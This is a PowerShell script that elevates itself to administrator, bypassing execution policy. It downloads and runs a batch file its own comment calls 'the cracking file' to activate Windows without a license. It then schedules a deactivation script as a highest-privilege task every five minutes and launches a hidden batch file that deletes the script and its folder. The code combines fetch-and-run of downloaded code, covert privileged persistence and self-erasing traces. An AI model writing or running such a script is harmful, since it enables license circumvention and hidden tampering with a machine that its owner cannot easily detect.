# Step 1 : download the batch file and run it (Done)
# Step 2 : Make a Task to remove the the activation key after a specific period of time using those commands (Done)
    # slmgr /upk	    Uninstalls the current product key, putting Windows into an unlicensed state .
    # slmgr /cpky	    Removes the product key from the Windows Registry so it can't be read by other software .
    # slmgr /ckms	    Clears the custom KMS server address, stopping Windows from trying to connect to it .
    # slmgr /rearm	    Resets the Windows activation timers (requires a restart)
# Step Final : Remove the batch file and this script itself (Done)




function Require-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($currentUser)
    
    if (-NOT $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Elevating to administrator..." -ForegroundColor Yellow
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args" -Verb RunAs
        exit
    }
}

# Asking for Admin Privileges
Require-Admin

# STEP 1 #
$scriptFolder = "C:\Scripts"
if (-not (Test-Path $scriptFolder)) { # if the Scripts folder is not exist , make it
    New-Item -ItemType Directory -Path $scriptFolder -Force
}
$filePath = Join-Path $scriptFolder "MAS_AIO.cmd" # The cracking file 

# Method 1
Invoke-WebRequest -Uri "http://localhost:8080/the-blob-blog/MAS_AIO.cmd" -OutFile $filePath
& $filePath

# # Method 2
# $url = "http://localhost:8080/the-blob-blog/batchfile.bat"
# (New-Object System.Net.WebClient).DownloadFile($url, ".\batchFilooo.bat")
# & ".\batchFilooo.bat"



# STEP 2 #
$deactivationScriptPath = Join-Path $scriptFolder "deactivation.bat"
Invoke-WebRequest -Uri "http://localhost:8080/the-blob-blog/deactivation.bat" -OutFile $deactivationScriptPath 

# & schtasks /create /tn "theblobDeactivation" /tr $deactivationScriptPath /sc MONTHLY /mo 3 /d 1 /st 15:00 /RL HIGHEST /F
& schtasks /create /tn "theblobDeactivation" /tr $deactivationScriptPath /sc minute /mo 5 /d 1 /st 15:00 /RL HIGHEST /F



# STEP 3 # 

# Get the full path to THIS PowerShell script
# $PSCommandPath is a built-in automatic variable in PowerShell that contains the full path to the script file that is currently being executed. 
# $PSScriptRoot is another built-in automatic variable that contains the folder path where the script is located (without the filename).
$selfPath = $PSCommandPath

# Create a delayed cleanup batch file
$cleanupContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q "$selfPath" 2>nul
rmdir /s /q "C:\Scripts" 2>nul
del /f /q "%~f0" 2>nul
exit /b 0
"@

# Line	                        What It Does
# @echo off	                    Prevents commands from being shown on screen
# timeout /t 2 /nobreak >nul	    Waits 2 seconds (gives PowerShell time to exit)
# rmdir /s /q "C:\Scripts" 2>nul	Deletes the entire C:\Scripts folder and everything inside it
# del /f /q "%~f0" 2>nul	        Deletes the cleanup batch file itself
# exit /b 0	                    Exits with success code

$cleanupPath = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
[System.IO.File]::WriteAllText($cleanupPath, $cleanupContent)

# Run cleanup and exit
Start-Process -FilePath $cleanupPath -WindowStyle Hidden
exit



